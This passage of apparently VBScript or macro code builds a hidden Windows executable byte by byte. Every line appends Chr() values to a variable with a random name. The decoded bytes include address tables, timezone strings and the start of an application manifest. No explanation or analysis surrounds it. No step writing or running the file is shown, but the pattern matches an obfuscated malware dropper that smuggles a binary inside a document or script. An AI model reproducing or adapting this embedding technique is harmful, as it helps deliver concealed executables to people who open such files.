gfoN=gfoN&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(97)&Chr(98)&Chr(99)&Chr(100)&Chr(101)&Chr(102)&Chr(103)&Chr(104)&Chr(105)&Chr(106)&Chr(107)&Chr(108)&Chr(109)&Chr(110)&Chr(111)&Chr(112)&Chr(113)&Chr(114)&Chr(115)&Chr(116)&Chr(117)&Chr(118)&Chr(119)&Chr(120)&Chr(121)&Chr(122)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(65)&Chr(66)&Chr(67)&Chr(68)&Chr(69)&Chr(70)&Chr(71)&Chr(72)&Chr(73)&Chr(74)&Chr(75)
gfoN=gfoN&Chr(76)&Chr(77)&Chr(78)&Chr(79)&Chr(80)&Chr(81)&Chr(82)&Chr(83)&Chr(84)&Chr(85)&Chr(86)&Chr(87)&Chr(88)&Chr(89)&Chr(90)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)
gfoN=gfoN&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(224)&Chr(163)&Chr(64)&Chr(0)&Chr(1)&Chr(2)&Chr(4)&Chr(8)&Chr(164)&Chr(3)&Chr(0)&Chr(0)&Chr(96)&Chr(130)&Chr(121)&Chr(130)&Chr(33)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(166)&Chr(223)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(161)&Chr(165)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(129)&Chr(159)&Chr(224)&Chr(252)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(64)&Chr(126)&Chr(128)&Chr(252)
gfoN=gfoN&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(168)&Chr(3)&Chr(0)&Chr(0)&Chr(193)&Chr(163)&Chr(218)&Chr(163)&Chr(32)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(129)&Chr(254)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(64)&Chr(254)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(181)&Chr(3)&Chr(0)&Chr(0)&Chr(193)&Chr(163)&Chr(218)&Chr(163)&Chr(32)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(129)&Chr(254)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(65)&Chr(254)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)
gfoN=gfoN&Chr(182)&Chr(3)&Chr(0)&Chr(0)&Chr(207)&Chr(162)&Chr(228)&Chr(162)&Chr(26)&Chr(0)&Chr(229)&Chr(162)&Chr(232)&Chr(162)&Chr(91)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(129)&Chr(254)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(64)&Chr(126)&Chr(161)&Chr(254)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(81)&Chr(5)&Chr(0)&Chr(0)&Chr(81)&Chr(218)&Chr(94)&Chr(218)&Chr(32)&Chr(0)&Chr(95)&Chr(218)&Chr(106)&Chr(218)&Chr(50)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(129)&Chr(211)&Chr(216)&Chr(222)&Chr(224)&Chr(249)&Chr(0)&Chr(0)&Chr(49)&Chr(126)&Chr(129)&Chr(254)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(236)&Chr(139)&Chr(64)&Chr(0)
gfoN=gfoN&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(67)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(1)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)
gfoN=gfoN&Chr(8)&Chr(169)&Chr(64)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(8)&Chr(169)&Chr(64)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(8)&Chr(169)&Chr(64)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(8)&Chr(169)&Chr(64)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(8)&Chr(169)&Chr(64)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(1)&Chr(0)&Chr(0)&Chr(0)&Chr(1)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)
gfoN=gfoN&Chr(224)&Chr(170)&Chr(64)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(232)&Chr(137)&Chr(64)&Chr(0)&Chr(112)&Chr(142)&Chr(64)&Chr(0)&Chr(240)&Chr(143)&Chr(64)&Chr(0)&Chr(32)&Chr(170)&Chr(64)&Chr(0)&Chr(16)&Chr(169)&Chr(64)&Chr(0)&Chr(1)&Chr(0)&Chr(0)&Chr(0)&Chr(16)&Chr(169)&Chr(64)&Chr(0)&Chr(224)&Chr(163)&Chr(64)&Chr(0)&Chr(78)&Chr(230)&Chr(64)&Chr(187)&Chr(177)&Chr(25)&Chr(191)&Chr(68)&Chr(3)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(232)&Chr(137)&Chr(64)&Chr(0)&Chr(234)&Chr(139)&Chr(64)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(24)&Chr(146)&Chr(64)&Chr(0)&Chr(20)&Chr(146)&Chr(64)&Chr(0)&Chr(16)&Chr(146)&Chr(64)&Chr(0)&Chr(12)&Chr(146)&Chr(64)&Chr(0)
gfoN=gfoN&Chr(8)&Chr(146)&Chr(64)&Chr(0)&Chr(4)&Chr(146)&Chr(64)&Chr(0)&Chr(0)&Chr(146)&Chr(64)&Chr(0)&Chr(248)&Chr(145)&Chr(64)&Chr(0)&Chr(240)&Chr(145)&Chr(64)&Chr(0)&Chr(232)&Chr(145)&Chr(64)&Chr(0)&Chr(220)&Chr(145)&Chr(64)&Chr(0)&Chr(208)&Chr(145)&Chr(64)&Chr(0)&Chr(200)&Chr(145)&Chr(64)&Chr(0)&Chr(188)&Chr(145)&Chr(64)&Chr(0)&Chr(184)&Chr(145)&Chr(64)&Chr(0)&Chr(180)&Chr(145)&Chr(64)&Chr(0)&Chr(176)&Chr(145)&Chr(64)&Chr(0)&Chr(172)&Chr(145)&Chr(64)&Chr(0)&Chr(168)&Chr(145)&Chr(64)&Chr(0)&Chr(164)&Chr(145)&Chr(64)&Chr(0)&Chr(160)&Chr(145)&Chr(64)&Chr(0)&Chr(156)&Chr(145)&Chr(64)&Chr(0)&Chr(152)&Chr(145)&Chr(64)&Chr(0)&Chr(148)&Chr(145)&Chr(64)&Chr(0)&Chr(144)&Chr(145)&Chr(64)&Chr(0)&Chr(140)&Chr(145)&Chr(64)&Chr(0)&Chr(132)&Chr(145)&Chr(64)&Chr(0)&Chr(120)&Chr(145)&Chr(64)&Chr(0)&Chr(112)&Chr(145)&Chr(64)&Chr(0)
gfoN=gfoN&Chr(104)&Chr(145)&Chr(64)&Chr(0)&Chr(168)&Chr(145)&Chr(64)&Chr(0)&Chr(96)&Chr(145)&Chr(64)&Chr(0)&Chr(88)&Chr(145)&Chr(64)&Chr(0)&Chr(80)&Chr(145)&Chr(64)&Chr(0)&Chr(68)&Chr(145)&Chr(64)&Chr(0)&Chr(60)&Chr(145)&Chr(64)&Chr(0)&Chr(48)&Chr(145)&Chr(64)&Chr(0)&Chr(36)&Chr(145)&Chr(64)&Chr(0)&Chr(32)&Chr(145)&Chr(64)&Chr(0)&Chr(28)&Chr(145)&Chr(64)&Chr(0)&Chr(16)&Chr(145)&Chr(64)&Chr(0)&Chr(252)&Chr(144)&Chr(64)&Chr(0)&Chr(240)&Chr(144)&Chr(64)&Chr(0)&Chr(9)&Chr(4)&Chr(0)&Chr(0)&Chr(1)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(32)&Chr(170)&Chr(64)&Chr(0)&Chr(46)&Chr(0)&Chr(0)&Chr(0)&Chr(220)&Chr(170)&Chr(64)&Chr(0)&Chr(196)&Chr(178)&Chr(64)&Chr(0)&Chr(196)&Chr(178)&Chr(64)&Chr(0)&Chr(196)&Chr(178)&Chr(64)&Chr(0)&Chr(196)&Chr(178)&Chr(64)&Chr(0)&Chr(196)&Chr(178)&Chr(64)&Chr(0)
gfoN=gfoN&Chr(196)&Chr(178)&Chr(64)&Chr(0)&Chr(196)&Chr(178)&Chr(64)&Chr(0)&Chr(196)&Chr(178)&Chr(64)&Chr(0)&Chr(196)&Chr(178)&Chr(64)&Chr(0)&Chr(127)&Chr(127)&Chr(127)&Chr(127)&Chr(127)&Chr(127)&Chr(127)&Chr(127)&Chr(224)&Chr(170)&Chr(64)&Chr(0)&Chr(1)&Chr(0)&Chr(0)&Chr(0)&Chr(46)&Chr(0)&Chr(0)&Chr(0)&Chr(1)&Chr(0)&Chr(0)&Chr(0)&Chr(32)&Chr(5)&Chr(147)&Chr(25)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(128)&Chr(112)&Chr(0)&Chr(0)&Chr(1)&Chr(0)&Chr(0)&Chr(0)&Chr(240)&Chr(241)&Chr(255)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(80)&Chr(83)&Chr(84)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)
gfoN=gfoN&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(80)&Chr(68)&Chr(84)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)
gfoN=gfoN&Chr(64)&Chr(171)&Chr(64)&Chr(0)&Chr(128)&Chr(171)&Chr(64)&Chr(0)&Chr(255)&Chr(255)&Chr(255)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(255)&Chr(255)&Chr(255)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(255)&Chr(255)&Chr(255)&Chr(255)&Chr(30)&Chr(0)&Chr(0)&Chr(0)&Chr(59)&Chr(0)&Chr(0)&Chr(0)&Chr(90)&Chr(0)&Chr(0)&Chr(0)&Chr(120)&Chr(0)&Chr(0)&Chr(0)&Chr(151)&Chr(0)&Chr(0)&Chr(0)&Chr(181)&Chr(0)&Chr(0)&Chr(0)&Chr(212)&Chr(0)&Chr(0)&Chr(0)&Chr(243)&Chr(0)&Chr(0)&Chr(0)&Chr(17)&Chr(1)&Chr(0)&Chr(0)&Chr(48)&Chr(1)&Chr(0)&Chr(0)&Chr(78)&Chr(1)&Chr(0)&Chr(0)&Chr(109)&Chr(1)&Chr(0)&Chr(0)&Chr(255)&Chr(255)&Chr(255)&Chr(255)&Chr(30)&Chr(0)&Chr(0)&Chr(0)&Chr(58)&Chr(0)&Chr(0)&Chr(0)&Chr(89)&Chr(0)&Chr(0)&Chr(0)
gfoN=gfoN&Chr(119)&Chr(0)&Chr(0)&Chr(0)&Chr(150)&Chr(0)&Chr(0)&Chr(0)&Chr(180)&Chr(0)&Chr(0)&Chr(0)&Chr(211)&Chr(0)&Chr(0)&Chr(0)&Chr(242)&Chr(0)&Chr(0)&Chr(0)&Chr(16)&Chr(1)&Chr(0)&Chr(0)&Chr(47)&Chr(1)&Chr(0)&Chr(0)&Chr(77)&Chr(1)&Chr(0)&Chr(0)&Chr(108)&Chr(1)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)
gfoN=gfoN&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)
gfoN=gfoN&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)
gfoN=gfoN&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)
gfoN=gfoN&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(4)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(1)&Chr(0)&Chr(24)&Chr(0)&Chr(0)&Chr(0)&Chr(24)&Chr(0)&Chr(0)&Chr(128)
gfoN=gfoN&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(4)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(1)&Chr(0)&Chr(1)&Chr(0)&Chr(0)&Chr(0)&Chr(48)&Chr(0)&Chr(0)&Chr(128)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(4)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(1)&Chr(0)&Chr(9)&Chr(4)&Chr(0)&Chr(0)&Chr(72)&Chr(0)&Chr(0)&Chr(0)&Chr(88)&Chr(192)&Chr(0)&Chr(0)&Chr(90)&Chr(1)&Chr(0)&Chr(0)&Chr(228)&Chr(4)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(60)&Chr(97)&Chr(115)&Chr(115)&Chr(101)&Chr(109)&Chr(98)&Chr(108)&Chr(121)&Chr(32)&Chr(120)&Chr(109)&Chr(108)&Chr(110)&Chr(115)&Chr(61)&Chr(34)&Chr(117)&Chr(114)&Chr(110)&Chr(58)&Chr(115)&Chr(99)&Chr(104)&Chr(101)&Chr(109)&Chr(97)&Chr(115)&Chr(45)&Chr(109)&Chr(105)&Chr(99)&Chr(114)&Chr(111)&Chr(115)&Chr(111)
gfoN=gfoN&Chr(102)&Chr(116)&Chr(45)&Chr(99)&Chr(111)&Chr(109)&Chr(58)&Chr(97)&Chr(115)&Chr(109)&Chr(46)&Chr(118)&Chr(49)&Chr(34)&Chr(32)&Chr(109)&Chr(97)&Chr(110)&Chr(105)&Chr(102)&Chr(101)&Chr(115)&Chr(116)&Chr(86)&Chr(101)&Chr(114)&Chr(115)&Chr(105)&Chr(111)&Chr(110)&Chr(61)&Chr(34)&Chr(49)&Chr(46)&Chr(48)&Chr(34)&Chr(62)&Chr(13)&Chr(10)&Chr(32)&Chr(32)&Chr(60)&Chr(116)&Chr(114)&Chr(117)&Chr(115)&Chr(116)&Chr(73)&Chr(110)&Chr(102)&Chr(111)&Chr(32)&Chr(120)&Chr(109)&Chr(108)&Chr(110)&Chr(115)&Chr(61)&Chr(34)&Chr(117)&Chr(114)&Chr(110)&Chr(58)&Chr(115)&Chr(99)&Chr(104)&Chr(101)&Chr(109)&Chr(97)&Chr(115)&Chr(45)&Chr(109)&Chr(105)&Chr(99)&Chr(114)&Chr(111)&Chr(115)&Chr(111)&Chr(102)&Chr(116)&Chr(45)&Chr(99)&Chr(111)&Chr(109)&Chr(58)&Chr(97)&Chr(115)&Chr(109)&Chr(46)&Chr(118)&Chr(51)&Chr(34)&Chr(62)&Chr(13)&Chr(10)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(60)
gfoN=gfoN&Chr(115)&Chr(101)&Chr(99)&Chr(117)&Chr(114)&Chr(105)&Chr(116)&Chr(121)&Chr(62)&Chr(13)&Chr(10)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(60)&Chr(114)&Chr(101)&Chr(113)&Chr(117)&Chr(101)&Chr(115)&Chr(116)&Chr(101)&Chr(100)&Chr(80)&Chr(114)&Chr(105)&Chr(118)&Chr(105)&Chr(108)&Chr(101)&Chr(103)&Chr(101)&Chr(115)&Chr(62)&Chr(13)&Chr(10)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(60)&Chr(114)&Chr(101)&Chr(113)&Chr(117)&Chr(101)&Chr(115)&Chr(116)&Chr(101)&Chr(100)&Chr(69)&Chr(120)&Chr(101)&Chr(99)&Chr(117)&Chr(116)&Chr(105)&Chr(111)&Chr(110)&Chr(76)&Chr(101)&Chr(118)&Chr(101)&Chr(108)&Chr(32)&Chr(108)&Chr(101)&Chr(118)&Chr(101)&Chr(108)&Chr(61)&Chr(34)&Chr(97)&Chr(115)&Chr(73)&Chr(110)&Chr(118)&Chr(111)&Chr(107)&Chr(101)&Chr(114)&Chr(34)&Chr(32)&Chr(117)&Chr(105)&Chr(65)&Chr(99)&Chr(99)&Chr(101)&Chr(115)&Chr(115)&Chr(61)
